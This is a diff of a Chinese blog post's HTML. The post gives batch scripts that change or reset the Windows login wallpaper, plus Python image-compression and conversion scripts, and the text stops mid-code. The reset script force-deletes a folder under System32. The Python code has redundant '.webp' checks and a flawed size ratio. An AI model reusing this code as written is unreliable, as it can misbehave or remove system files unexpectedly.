 &lt;h2 id="替换登录壁纸文件">替换登录壁纸文件&lt;/h2>
 &lt;p>&lt;strong>bat脚本更换登录壁纸源码&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Batchfile" data-lang="Batchfile">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">&lt;span class="p">@&lt;/span>&lt;span class="k">echo&lt;/span> off
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;source=&lt;/span>&lt;span class="nv">%~dp0&lt;/span>&lt;span class="s2">backgroundDefault.webp&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;destination=C:\Windows\System32\oobe\info\backgrounds&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">not&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Error: &lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2"> does not exist.&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl"> &lt;span class="k">pause&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> &lt;span class="k">exit&lt;/span> /b
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl">&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">11&lt;/span>&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">not&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">12&lt;/span>&lt;span class="cl"> &lt;span class="k">mkdir&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">13&lt;/span>&lt;span class="cl">&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">14&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">15&lt;/span>&lt;span class="cl">xcopy /y /exclude:&lt;span class="nv">%~nx0&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">16&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">17&lt;/span>&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;LEl_FENG BLOG.XPDBK.COM!&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">18&lt;/span>&lt;span class="cl">&lt;span class="k">pause&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>bat脚本换回默认壁纸&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-Batchfile" data-lang="Batchfile">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">&lt;span class="p">@&lt;/span>&lt;span class="k">echo&lt;/span> off
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="nv">folder&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s2">&amp;#34;C:\Windows\System32\oobe\info&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="nv">%folder%&lt;/span> &lt;span class="p">(&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl"> &lt;span class="k">echo&lt;/span> Deleting &lt;span class="nv">%folder%&lt;/span>...
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl"> &lt;span class="k">rmdir&lt;/span> /s /q &lt;span class="nv">%folder%&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl"> &lt;span class="k">echo&lt;/span> Folder deleted.
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl">&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">(&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nv">%folder%&lt;/span> does not exist.
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl">&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl">&lt;span class="k">pause&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="图片一键包图片改后缀和不是很好的图片压缩器">图片一键包（图片改后缀和不是很好的图片压缩器）&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Batchfile" data-lang="Batchfile">&lt;span class="line">&lt;span class="cl">&lt;span class="p">@&lt;/span>&lt;span class="k">echo&lt;/span> off
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;source=&lt;/span>&lt;span class="nv">%~dp0&lt;/span>&lt;span class="s2">backgroundDefault.webp&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;destination=C:\Windows\System32\oobe\info\backgrounds&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">not&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Error: &lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2"> does not exist.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pause&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span> /b
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">not&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">mkdir&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xcopy /y /exclude:&lt;span class="nv">%~nx0&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%source%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%destination%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;LEl_FENG BLOG.XPDBK.COM!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">pause&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>bat脚本换回默认壁纸&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Batchfile" data-lang="Batchfile">&lt;span class="line">&lt;span class="cl">&lt;span class="p">@&lt;/span>&lt;span class="k">echo&lt;/span> off
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="nv">folder&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s2">&amp;#34;C:\Windows\System32\oobe\info&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="k">exist&lt;/span> &lt;span class="nv">%folder%&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> Deleting &lt;span class="nv">%folder%&lt;/span>...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">rmdir&lt;/span> /s /q &lt;span class="nv">%folder%&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> Folder deleted.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nv">%folder%&lt;/span> does not exist.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">pause&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="图片一键包图片改后缀和不是很好的图片压缩器">图片一键包（图片改后缀和不是很好的图片压缩器）&lt;/h2>
 &lt;p>&lt;strong>图片压缩&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">compress_image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_size&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">img&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl"> &lt;span class="c1"># 获取原图尺寸&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl"> &lt;span class="n">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> &lt;span class="c1"># 计算压缩比例&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl"> &lt;span class="n">ratio&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">max_size&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getsize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl"> &lt;span class="c1"># 计算压缩后的尺寸&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">11&lt;/span>&lt;span class="cl"> &lt;span class="n">compressed_width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">width&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">ratio&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">12&lt;/span>&lt;span class="cl"> &lt;span class="n">compressed_height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">height&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">ratio&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">13&lt;/span>&lt;span class="cl"> &lt;span class="c1"># 压缩图片并保存&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">14&lt;/span>&lt;span class="cl"> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">thumbnail&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">compressed_width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">compressed_height&lt;/span>&lt;span class="p">))&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">15&lt;/span>&lt;span class="cl"> &lt;span class="n">img&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output_path&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">16&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">17&lt;/span>&lt;span class="cl">&lt;span class="c1"># 定义目标目录和最大文件大小&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">18&lt;/span>&lt;span class="cl">&lt;span class="n">target_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;pop&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">19&lt;/span>&lt;span class="cl">&lt;span class="n">max_file_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">250&lt;/span> &lt;span class="c1"># 单位为 KB&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">20&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">21&lt;/span>&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">dirs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">files&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">walk&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">target_dir&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">22&lt;/span>&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">filename&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">files&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">23&lt;/span>&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">24&lt;/span>&lt;span class="cl"> &lt;span class="n">input_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">25&lt;/span>&lt;span class="cl"> &lt;span class="n">output_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;compressed_&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">26&lt;/span>&lt;span class="cl"> &lt;span class="n">compress_image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_file_size&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>图片后缀转换&lt;/strong>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="ln"> 1&lt;/span>&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 2&lt;/span>&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 3&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 4&lt;/span>&lt;span class="cl">&lt;span class="n">directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;./pop&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 5&lt;/span>&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 6&lt;/span>&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">filename&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">listdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 7&lt;/span>&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.bmp&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 8&lt;/span>&lt;span class="cl"> &lt;span class="n">img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln"> 9&lt;/span>&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">Image&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">img_path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">im&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="ln">10&lt;/span>&lt;span class="cl"> &lt;span class="n">im&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">convert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;RGB&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">splitext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">img_path&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;.webp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="注意">注意：&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">PIL&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Image&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">compress_image&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_size&lt;/span>&lt;span class="p">):&lt;/span>
